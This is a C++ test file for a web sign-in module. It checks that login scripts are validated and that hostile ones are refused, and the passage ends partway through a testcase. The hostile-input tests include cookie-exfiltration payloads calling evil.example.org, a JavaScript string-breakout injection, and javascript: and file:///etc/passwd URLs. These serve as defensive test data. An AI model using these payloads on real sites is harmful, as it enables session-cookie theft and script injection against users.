/*
 *  gucefASSETSTORE_TestApp: tests of the gucefASSETSTORE module
 *
 *  Copyright (C) 1998 - 2026.  Dinand Vanvelzen
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

/*-------------------------------------------------------------------------//
//                                                                         //
//      INCLUDES                                                           //
//                                                                         //
//-------------------------------------------------------------------------*/

#include <string.h>

#ifndef GUCEF_CORE_DVCPPSTRINGUTILS_H
#include "dvcppstringutils.h"
#define GUCEF_CORE_DVCPPSTRINGUTILS_H
#endif /* GUCEF_CORE_DVCPPSTRINGUTILS_H ? */
#ifndef GUCEF_CORE_DVCPPFILEUTILS_H
#include "dvcppfileutils.h"
#define GUCEF_CORE_DVCPPFILEUTILS_H
#endif /* GUCEF_CORE_DVCPPFILEUTILS_H ? */
#ifndef GUCEF_CORE_DVCPPOSWRAP_H
#include "DVCPPOSWRAP.h"
#define GUCEF_CORE_DVCPPOSWRAP_H
#endif /* GUCEF_CORE_DVCPPOSWRAP_H ? */
#ifndef GUCEF_CORE_CDYNAMICBUFFER_H
#include "CDynamicBuffer.h"
#define GUCEF_CORE_CDYNAMICBUFFER_H
#endif /* GUCEF_CORE_CDYNAMICBUFFER_H ? */
#ifndef GUCEF_CORE_CVARIANTSTREAM_H
#include "gucefCORE_CVariantStream.h"
#define GUCEF_CORE_CVARIANTSTREAM_H
#endif /* GUCEF_CORE_CVARIANTSTREAM_H ? */
#ifndef GUCEF_CORE_LOGGING_H
#include "gucefCORE_Logging.h"
#define GUCEF_CORE_LOGGING_H
#endif /* GUCEF_CORE_LOGGING_H ? */
#ifndef GUCEF_WEB_CHTTPCLIENT_H
#include "gucefWEB_CHTTPClient.h"
#define GUCEF_WEB_CHTTPCLIENT_H
#endif /* GUCEF_WEB_CHTTPCLIENT_H ? */
#ifndef GUCEF_AUTH_CFILECREDENTIALSTORE_H
#include "gucefAUTH_CFileCredentialStore.h"
#define GUCEF_AUTH_CFILECREDENTIALSTORE_H
#endif /* GUCEF_AUTH_CFILECREDENTIALSTORE_H ? */
#ifndef GUCEF_AUTH_CMEMORYCREDENTIALSTORE_H
#include "gucefAUTH_CMemoryCredentialStore.h"
#define GUCEF_AUTH_CMEMORYCREDENTIALSTORE_H
#endif /* GUCEF_AUTH_CMEMORYCREDENTIALSTORE_H ? */
#ifndef GUCEF_ASSETSTORE_H
#include "gucefASSETSTORE.h"
#define GUCEF_ASSETSTORE_H
#endif /* GUCEF_ASSETSTORE_H ? */
#ifndef GUCEF_TEST_LOG_CAPTURE_H
#include "gucef_test_log_capture.h"
#define GUCEF_TEST_LOG_CAPTURE_H
#endif /* GUCEF_TEST_LOG_CAPTURE_H ? */

#include "TestAssetStoreSupport.h"
#include "TestFakeLoginSite.h"
#include "TestFakeSignInBrowser.h"
#include "TestFakeStoreProvider.h"
#include "TestWebSignIn.h"

/*-------------------------------------------------------------------------//
//                                                                         //
//      UTILITIES                                                          //
//                                                                         //
//-------------------------------------------------------------------------*/

using namespace GUCEF;
using namespace GUCEF::ASSETSTORE;
using namespace ASSETSTORETEST;

namespace {

const char* TestEmail = "owner@example.test";
const char* TestPassword = "Pa55-w0rd!\"q'Zx";
const char* TestEmailCode = "731905";
const char* StoreId = "fakeweb";

/** A login script for the fake login site */
CWebLoginScript
MakeSiteScript( const CFakeLoginSite& site )
{
    CWebLoginScript script;
    script.name = "Fake login site";
    script.startUrl = site.GetBaseUrl() + "/login";
    script.cookieDomains.push_back( "127.0.0.1" );
    script.credentialSlots.push_back( "username" );
    script.credentialSlots.push_back( "password" );
    script.signedIn.selector = "#account";
    script.signedIn.cookie = "sid";
    script.sessionEndedStatusCodes.push_back( 401 );
    script.sessionEndedRedirectPattern = site.GetBaseUrl() + "/login*";
    script.stepTimeoutInMs = 3000;

    CWebLoginScriptStep step;
    step.action = CWebLoginScriptStep::ACTION_FILL;
    step.selector = "input[name=email]";
    step.credential = "username";
    script.steps.push_back( step );
    step.selector = "input[name=\"password\"]";
    step.credential = "password";
    script.steps.push_back( step );

    step = CWebLoginScriptStep();
    step.action = CWebLoginScriptStep::ACTION_SUBMIT;
    step.selector = "form#login";
    script.steps.push_back( step );

    step = CWebLoginScriptStep();
    step.action = CWebLoginScriptStep::ACTION_FAIL_CHECK;
    step.condition.selector = ".login-error";
    step.reason = "The site refused the e-mail address or password";
    script.steps.push_back( step );

    step = CWebLoginScriptStep();
    step.action = CWebLoginScriptStep::ACTION_PERSON_CHECK;
    step.condition.selector = "#captcha";
    step.kind = "captcha";
    step.prompt = "Solve the puzzle in the browser window";
    script.steps.push_back( step );

    step = CWebLoginScriptStep();
    step.action = CWebLoginScriptStep::ACTION_PERSON_CHECK;
    step.condition.selector = "input[name=code]";
    step.kind = "code";
    step.prompt = "Type the code from your e-mail in the browser window";
    script.steps.push_back( step );

    step = CWebLoginScriptStep();
    step.action = CWebLoginScriptStep::ACTION_WAIT_FOR_SIGNED_IN;
    step.timeoutInMs = 5000;
    script.steps.push_back( step );
    return script;
}

CWebSessionSignInSettings
MakeSettings( const CFakeLoginSite& site )
{
    CWebSessionSignInSettings settings;
    settings.storeId = StoreId;
    settings.script = MakeSiteScript( site );
    settings.signInTimeoutInMs = 30000;
    settings.handOverTimeoutInMs = 10000;
    settings.pollIntervalInMs = 20;
    settings.browser.profileDirectory = TestDirectory( "websignin-profile" );
    return settings;
}

CWebSignInCredentials
MakeCredentials( const char* password )
{
    CWebSignInCredentials credentials;
    credentials.Set( "username", AUTH::CSecretString( TestEmail ) );
    credentials.Set( "password", AUTH::CSecretString( password ) );
    return credentials;
}

/** GETs the library of the site with the jar; the answer for CheckResponse() */
int
GetLibrary( const CFakeLoginSite& site, WEB::CHttpCookieJarPtr jar, WEB::CHttpResponseData& response )
{
    WEB::CHttpRequestData request;
    request.SetUrl( site.GetBaseUrl() + "/api/library" );
    request.requestType = "GET";
    WEB::CHttpClientRequestOptions options;
    options.cookieJar = jar;
    options.followRedirects = false;
    options.totalTimeoutInMs = 10000;
    WEB::CHTTPClient client;
    response = WEB::CHttpResponseData();
    if ( !client.Execute( request, options, response ) )
        return 0;
    return response.statusCode;
}

/** Whether the bytes of the file hold the text */
bool
FileHolds( const CORE::CString& path, const CORE::CString& text )
{
    CORE::CDynamicBuffer content;
    if ( text.IsNULLOrEmpty() || !content.LoadContentFromFile( path ) || 0 == content.GetDataSize() )
        return false;
    const UInt32 textSize = text.ByteSize() - 1;
    const char* bytes = content.AsConstTypePtr< char >();
    for ( UInt32 i=0; i+textSize<=content.GetDataSize(); ++i )
        if ( 0 == memcmp( bytes + i, text.C_String(), textSize ) )
            return true;
    return false;
}

/** Whether a file of the folder (not its sub folders) holds the text */
bool
FolderHolds( const CORE::CString& folder, const CORE::CString& text )
{
    const char* names[] = { "credentials.bin", "credentials.key", "credentials.lock" };
    for ( UInt32 i=0; i<3; ++i )
    {
        CORE::CString path = folder;
        CORE::AppendToPath( path, names[ i ] );
        if ( CORE::FileExists( path ) && FileHolds( path, text ) )
            return true;
    }
    return false;
}

/** Plays the owner: records the events of a sign in and, when asked to act, acts on the first owner action event */
class CSignInRecorder : public CORE::CObserver
{
    public:

    enum EAction
    {
        ACT_NONE = 0        ,
        ACT_PERSON          ,   /**< fills and clicks in the test browser */
        ACT_CANCEL          ,
        ACT_CLOSE_WINDOW    ,
        ACT_APPROVE             /**< the site lets the next reload of its challenge pass */
    };

    CSignInRecorder( void )
        : CORE::CObserver()
        , starting( 0 ), progress( 0 ), ownerActions( 0 ), signedIn( 0 ), failed( 0 ), ended( 0 )
        , lastPrompt(), lastKind(), lastStatus( ASSETSTORE_STATUS_OK ), lastHandedOver( false ), startingHeadless( false )
        , m_action( ACT_NONE ), m_browser( GUCEF_NULL ), m_signIn( GUCEF_NULL ), m_site( GUCEF_NULL ), m_fills(), m_clicks()
    {}

    void ActAsPerson( CFakeSignInBrowser* browser )                 { m_action = ACT_PERSON; m_browser = browser; }
    void Fill( const CORE::CString& selector, const CORE::CString& value ) { m_fills.push_back( selector ); m_fills.push_back( value ); }
    void ClickOn( const CORE::CString& selector )                   { m_clicks.push_back( selector ); }
    void CancelOnOwnerAction( CWebSessionSignIn* signIn )           { m_action = ACT_CANCEL; m_signIn = signIn; }
    void CloseWindowOnOwnerAction( CFakeSignInBrowser* browser )    { m_action = ACT_CLOSE_WINDOW; m_browser = browser; }
    void ApproveOnOwnerAction( CFakeLoginSite* site )               { m_action = ACT_APPROVE; m_site = site; }

    virtual void OnNotify( CORE::CNotifier* notifier, const CORE::CEvent& eventId, CORE::CICloneable* eventData ) GUCEF_VIRTUAL_OVERRIDE
    {
        if ( eventId == CWebSessionSignIn::SignInStartingEvent )
        {
            ++starting;
            startingHeadless = static_cast< CWebSignInEventData* >( eventData )->headless;
        }
        else
        if ( eventId == CWebSessionSignIn::ProgressEvent )
            ++progress;
        else
        if ( eventId == CWebSessionSignIn::OwnerActionNeededEvent )
        {
            ++ownerActions;
            const CWebSignInEventData* data = static_cast< CWebSignInEventData* >( eventData );
            lastPrompt = data->message;
            lastKind = data->personCheckKind;
            Act();
        }
        else
        if ( eventId == CWebSessionSignIn::SignedInEvent || eventId == CWebSessionSignIn::SignInFailedEvent )
        {
            const CWebSignInResult* result = static_cast< CWebSignInResult* >( eventData );
            lastStatus = result->status;
            lastHandedOver = result->handedOver;
            if ( eventId == CWebSessionSignIn::SignedInEvent )
                ++signedIn;
            else
                ++failed;
        }
        else
        if ( eventId == CWebSessionSignIn::SessionEndedEvent )
            ++ended;
    }

    UInt32 starting, progress, ownerActions, signedIn, failed, ended;
    CORE::CString lastPrompt;
    CORE::CString lastKind;
    TAssetStoreStatus lastStatus;
    bool lastHandedOver;
    bool startingHeadless;

    private:

    void Act( void )
    {
        const EAction action = m_action;
        m_action = ACT_NONE;
        switch ( action )
        {
            case ACT_PERSON:
            {
                for ( size_t i=0; i+1<m_fills.size(); i+=2 )
                    m_browser->PersonFill( m_fills[ i ], m_fills[ i + 1 ] );
                for ( size_t i=0; i<m_clicks.size(); ++i )
                    m_browser->PersonClick( m_clicks[ i ] );
                break;
            }
            case ACT_CANCEL: m_signIn->Cancel(); break;
            case ACT_CLOSE_WINDOW: m_browser->PersonClosesWindow(); break;
            case ACT_APPROVE: m_site->ApproveChallenge(); break;
            default: break;
        }
    }

    EAction m_action;
    CFakeSignInBrowser* m_browser;
    CWebSessionSignIn* m_signIn;
    CFakeLoginSite* m_site;
    CORE::CString::StringVector m_fills;
    CORE::CString::StringVector m_clicks;
};

/** Subscribes the recorder to every event of the sign in */
void
Record( CSignInRecorder& recorder, CWebSessionSignIn& signIn )
{
    recorder.SubscribeTo( &signIn, CWebSessionSignIn::SignInStartingEvent );
    recorder.SubscribeTo( &signIn, CWebSessionSignIn::ProgressEvent );
    recorder.SubscribeTo( &signIn, CWebSessionSignIn::OwnerActionNeededEvent );
    recorder.SubscribeTo( &signIn, CWebSessionSignIn::SignedInEvent );
    recorder.SubscribeTo( &signIn, CWebSessionSignIn::SignInFailedEvent );
    recorder.SubscribeTo( &signIn, CWebSessionSignIn::SessionEndedEvent );
}

/** A store of the fake site on the provider base class: its library needs the web session */
class CTestWebStoreProvider : public CWebSessionAssetStoreProvider
{
    public:

    explicit CTestWebStoreProvider( const CFakeLoginSite& site ) : CWebSessionAssetStoreProvider(), m_site( site ) {}

    virtual ~CTestWebStoreProvider()
    {
        WaitForAsyncOperations();
        SignalUpcomingDestruction();
    }

    virtual const CORE::CString& GetProviderId( void ) const GUCEF_VIRTUAL_OVERRIDE
    {
        static const CORE::CString id = StoreId;
        return id;
    }

    virtual CORE::CString GetDisplayName( void ) const GUCEF_VIRTUAL_OVERRIDE { return "Fake web store"; }

    virtual TAssetStoreStatus QueryLibrary( const CAssetStoreQuery& query, CAssetStoreLibraryPage& page ) GUCEF_VIRTUAL_OVERRIDE
    {
        if ( !IsSignedIn() )
            return ASSETSTORE_STATUS_NOT_SIGNED_IN;
        WEB::CHttpResponseData response;
        GetLibrary( m_site, GetCookieJar(), response );
        if ( CheckResponse( response ) )
            return ASSETSTORE_STATUS_SESSION_EXPIRED;
        if ( 200 != response.statusCode )
            return ASSETSTORE_STATUS_HTTP_ERROR;
        CAssetStoreItem item;
        item.itemId = "pack-1";
        item.title = "Pack one";
        page.items.push_back( item );
        return ASSETSTORE_STATUS_OK;
    }

    virtual TAssetStoreStatus GetItem( const CORE::CString& itemId, CAssetStoreItem& item ) GUCEF_VIRTUAL_OVERRIDE { return ASSETSTORE_STATUS_NOT_FOUND; }

    virtual TAssetStoreStatus PlanDownload( const CORE::CString& itemId, const CORE::CString& formatId, const CORE::CString::StringVector& fileIds,
                                            CAssetStoreDownloadPlan& plan ) GUCEF_VIRTUAL_OVERRIDE { return ASSETSTORE_STATUS_UNSUPPORTED; }

    private:

    const CFakeLoginSite& m_site;
};

/** Whether the problems hold a text */
bool
ProblemsMention( const CORE::CString::StringVector& problems, const char* text )
{
    for ( size_t i=0; i<problems.size(); ++i )
        if ( problems[ i ].HasSubstr( text, true ) >= 0 )
            return true;
    return false;
}

/** Loads the JSON text as a script; false and the problems when refused */
bool
LoadScript( const CORE::CString& json, CORE::CString::StringVector& problems )
{
    problems.clear();
    CWebLoginScript script;
    return script.LoadFromText( json, problems );
}

/** A valid script as JSON with the steps given (a JSON list of step objects) */
CORE::CString
ScriptJson( const CORE::CString& steps, const CORE::CString& extraTopLevel = CORE::CString::Empty )
{
    return "{ \"format\": \"gucef.webLoginScript\", \"version\": 1, \"name\": \"Example store\", "
           "\"startUrl\": \"https://shop.example.com/login\", \"cookieDomains\": [ \"shop.example.com\" ], "
           "\"allowedHosts\": [ \"accounts.example.com\" ], \"credentials\": [ \"username\", \"password\" ], "
           "\"signedIn\": { \"selector\": \"#account-menu\", \"cookie\": \"session_id\" }" + extraTopLevel + ", \"steps\": " + steps + " }";
}

}

/*-------------------------------------------------------------------------//
//                                                                         //
//      TESTS                                                              //
//                                                                         //
//-------------------------------------------------------------------------*/

static void
PerformLoginScriptTests( void )
{
    GUCEF_TESTFW_SUITE_SCOPE( "WebSignIn.LoginScript" );

    GUCEF_TESTFW_TESTCASE( "Test: A login script is read, validated, written and read again" )
        try
        {
            const CORE::CString json = ScriptJson(
                "[ { \"action\": \"open\", \"url\": \"https://accounts.example.com/signin\", \"comment\": \"the sign in service\" },"
                "  { \"action\": \"click\", \"selector\": \"#accept-cookies\", \"optional\": true, \"timeoutMs\": 3000 },"
                "  { \"action\": \"waitFor\", \"selector\": \"input[name=email]\", \"urlPattern\": \"https://accounts.example.com/*\" },"
                "  { \"action\": \"fill\", \"selector\": \"input[name=email]\", \"credential\": \"username\" },"
                "  { \"action\": \"fill\", \"selector\": \"input[name=password]\", \"credential\": \"password\" },"
                "  { \"action\": \"submit\", \"selector\": \"form#login\" },"
                "  { \"action\": \"failCheck\", \"text\": \"Wrong password\", \"reason\": \"The store refused the password\" },"
                "  { \"action\": \"personCheck\", \"kind\": \"captcha\", \"selector\": \"iframe[src*=captcha]\", \"prompt\": \"Solve the puzzle\" },"
                "  { \"action\": \"personCheck\", \"kind\": \"code\", \"selector\": \"input[name=code]\", \"prompt\": \"Type the code from your e-mail\" },"
                "  { \"action\": \"delay\", \"ms\": 500 },"
                "  { \"action\": \"waitForSignedIn\", \"timeoutMs\": 30000 } ]",
                ", \"sessionEnded\": { \"statusCodes\": [ 401, 403 ], \"redirectPattern\": \"https://shop.example.com/login*\" }, \"stepTimeoutMs\": 12000" );

            CORE::CString::StringVector problems;
            CWebLoginScript script;
            ASSERT_TRUE( script.LoadFromText( json, problems ) );
            ASSERT_TRUE( problems.empty() );
            ASSERT_TRUE( 1 == script.version && script.name == "Example store" && 11 == script.steps.size() );
            ASSERT_TRUE( 1 == script.cookieDomains.size() && 1 == script.allowedHosts.size() && 2 == script.credentialSlots.size() );
            ASSERT_TRUE( script.signedIn.selector == "#account-menu" && script.signedIn.cookie == "session_id" );
            ASSERT_TRUE( 2 == script.sessionEndedStatusCodes.size() && 403 == script.sessionEndedStatusCodes[ 1 ] );
            ASSERT_TRUE( 12000 == script.stepTimeoutInMs );
            if ( 11 == script.steps.size() )
            {
                ASSERT_TRUE( CWebLoginScriptStep::ACTION_OPEN == script.steps[ 0 ].action && script.steps[ 0 ].comment == "the sign in service" );
                ASSERT_TRUE( script.steps[ 1 ].optional && 3000 == script.steps[ 1 ].timeoutInMs && 3000 == script.GetStepTimeout( script.steps[ 1 ] ) );
                ASSERT_TRUE( 12000 == script.GetStepTimeout( script.steps[ 3 ] ) );
                ASSERT_TRUE( script.steps[ 2 ].condition.urlPattern == "https://accounts.example.com/*" );
                ASSERT_TRUE( script.steps[ 3 ].credential == "username" && script.steps[ 4 ].credential == "password" );
                ASSERT_TRUE( script.steps[ 7 ].kind == "captcha" && script.steps[ 7 ].prompt == "Solve the puzzle" );
                ASSERT_TRUE( 500 == script.steps[ 9 ].delayInMs );
            }
            ASSERT_TRUE( script.NeedsCredentials() );

            // written and read again: the same script
            CORE::CString written;
            ASSERT_TRUE( script.SaveToText( written ) );
            CWebLoginScript again;
            problems.clear();
            ASSERT_TRUE( again.LoadFromText( written, problems ) );
            ASSERT_TRUE( again.steps.size() == script.steps.size() && again.startUrl == script.startUrl );
            ASSERT_TRUE( again.sessionEndedRedirectPattern == script.sessionEndedRedirectPattern && 2 == again.sessionEndedStatusCodes.size() );
            ASSERT_TRUE( again.steps.size() > 7 && again.steps[ 7 ].condition.selector == "iframe[src*=captcha]" );

            // through a file
            CORE::CString path = TestDirectory( "websignin-scripts" );
            CORE::CreateDirs( path );
            CORE::AppendToPath( path, "login.json" );
            ASSERT_TRUE( script.SaveToFile( path ) );
            CWebLoginScript fromFile;
            problems.clear();
            ASSERT_TRUE( fromFile.LoadFromFile( path, problems ) );
            ASSERT_TRUE( fromFile.steps.size() == script.steps.size() );
            CORE::DeleteDir( TestDirectory( "websignin-scripts" ), true );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Malformed login scripts are refused with a clear message" )
        try
        {
            CORE::CString::StringVector problems;
            const CORE::CString steps = "[ { \"action\": \"waitForSignedIn\" } ]";

            ASSERT_FALSE( LoadScript( "this is not { json", problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "not JSON" ) );
            ASSERT_FALSE( LoadScript( "", problems ) );

            // format and version
            ASSERT_FALSE( LoadScript( "{ \"version\": 1, \"name\": \"x\" }", problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'format'" ) );
            CORE::CString json = ScriptJson( steps );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"version\": 1", "\"version\": 2" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "version 2 is not supported" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"version\": 1,", "" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'version' is missing" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"version\": 1", "\"version\": \"1\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'version' must be a whole number" ) );

            // the domains and addresses
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "[ \"shop.example.com\" ]", "[ ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'cookieDomains' is missing" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "[ \"shop.example.com\" ]", "[ \"*.example.com\" ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "is not a host name" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "[ \"shop.example.com\" ]", "\"shop.example.com\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "must be a list" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "https://shop.example.com/login", "https://evil.example.org/login" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "not one of the cookie domains" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "https://shop.example.com/login", "javascript:alert(1)" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "must be an http or https address" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "https://shop.example.com/login", "file:///etc/passwd" ), problems ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "https://shop.example.com/login", "https://shop.example.com@evil.example.org/login" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "no user information" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( ", \"signedIn\": { \"selector\": \"#account-menu\", \"cookie\": \"session_id\" }", "" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'signedIn' is missing" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"cookie\": \"session_id\"", "\"cookie\": \"bad name;\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "not a valid cookie name" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"cookie\": \"session_id\"", "\"onload\": \"x\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "is not a key of a condition" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "[ \"username\", \"password\" ]", "[ \"username\", \"username\" ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "declared twice" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"version\": 1", "\"version\": 1, \"stepTimeoutMs\": 600001" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'stepTimeoutMs' must be from 1" ) );

            // steps that are not right
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"fill\", \"selector\": \"#email\", \"credential\": \"email\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "is not declared in 'credentials'" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"fill\", \"selector\": \"#email\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'credential' is missing" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'selector' is missing" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": 12 } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'selector' must be text" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitFor\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "a condition needs at least one" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"personCheck\", \"kind\": \"robot\", \"selector\": \"#x\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'kind' must be" ) && ProblemsMention( problems, "'prompt' is missing" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"delay\", \"ms\": 0 } ]" ), problems ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"delay\", \"ms\": 60000 } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'ms' must be from 1 to 10000" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitForSignedIn\", \"timeoutMs\": -5 } ]" ), problems ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitFor\", \"selector\": \"#x\", \"optional\": \"yes\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'optional' must be true or false" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"selector\": \"#x\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'action' is missing" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ \"open\" ]" ), problems ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Hostile login scripts are refused: no code, no inline values, no other hosts" )
        try
        {
            CORE::CString::StringVector problems;

            // code in any form
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"eval\", \"expression\": \"fetch('https://evil.example.org/?'+document.cookie)\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'eval' is not an action" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": \"#x\", \"javascript\": \"alert(1)\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'javascript' is not allowed: a script holds no code" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitForSignedIn\" } ]", ", \"script\": \"document.cookie\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'script' is not allowed" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitForSignedIn\" } ]", ", \"onLoad\": { \"run\": \"x\" }" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'onLoad' is not a key of a login script" ) );

            // values typed from the script itself
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"fill\", \"selector\": \"#password\", \"value\": \"hunter2\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'value' is not allowed" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"fill\", \"selector\": \"#password\", \"credential\": \"password\", \"password\": \"hunter2\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "name a credential slot" ) );

            // a nested object where a step has text
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": { \"a\": 1 } } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "must not be an object or a list" ) );

            // other hosts: an open step and an allowed host that are not the store's
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"open\", \"url\": \"https://evil.example.org/collect\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "goes to evil.example.org" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"open\", \"url\": \"https://shop.example.com.evil.example.org/\" } ]" ), problems ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"open\", \"url\": \"https://shop.example.com:99999/\" } ]" ), problems ) );

            // control characters and sizes
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": \"#a\\n#b\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "control character" ) );
            CORE::CString longSelector = "#";
            for ( UInt32 i=0; i<600; ++i )
                longSelector += "a";
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": \"" + longSelector + "\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "longer than 512 bytes" ) );
            CORE::CString manySteps = "[ ";
            for ( UInt32 i=0; i<70; ++i )
                manySteps += CORE::CString( 0 == i ? "" : ", " ) + "{ \"action\": \"delay\", \"ms\": 1 }";
            manySteps += " ]";
            ASSERT_FALSE( LoadScript( ScriptJson( manySteps ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "more than 64 steps" ) );
            CORE::CString huge = ScriptJson( "[ ]", ", \"comment\": \"" );
            while ( huge.ByteSize() < 70000 )
                huge += "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
            ASSERT_FALSE( LoadScript( huge, problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "larger than 65536 bytes" ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Selectors and texts go into the fixed page queries as escaped literals only" )
        try
        {
            ASSERT_TRUE( CWebPageScriptHelpers::JsStringLiteral( "#email" ) == "\"#email\"" );
            ASSERT_TRUE( CWebPageScriptHelpers::JsStringLiteral( "a\"b\\c" ) == "\"a\\\"b\\\\c\"" );
            ASSERT_TRUE( CWebPageScriptHelpers::JsStringLiteral( "line\nbreak\t\x01" ) == "\"line\\u000abreak\\u0009\\u0001\"" );
            ASSERT_TRUE( CWebPageScriptHelpers::JsStringLiteral( "sep\xE2\x80\xA8" "ara\xE2\x80\xA9" "tor" ) == "\"sep\\u2028ara\\u2029tor\"" );
            ASSERT_TRUE( CWebPageScriptHelpers::JsStringLiteral( "caf\xC3\xA9" ) == "\"caf\xC3\xA9\"" );

            // a selector that tries to end the literal stays inside it
            const CORE::CString hostile = "\"); fetch('https://evil.example.org/?'+document.cookie); (\"";
            const CORE::CString literal = CWebPageScriptHelpers::JsStringLiteral( hostile );
            ASSERT_TRUE( literal == "\"\\\"); fetch('https://evil.example.org/?'+document.cookie); (\\\"\"" );
            const CORE::CString expression = CWebPageScriptHelpers::ElementStateExpression( hostile );
            ASSERT_TRUE( expression.StartsWith( "(function(s){try{var e=document.querySelector(s);" ) );
            ASSERT_TRUE( expression.EndsWith( ")(" + literal + ")" ) );

            // every query is one function called with one literal
            ASSERT_TRUE( CWebPageScriptHelpers::ClickExpression( "#go" ).EndsWith( ")(\"#go\")" ) );
            ASSERT_TRUE( CWebPageScriptHelpers::SubmitExpression( "form" ).HasSubstr( "requestSubmit" ) > 0 );
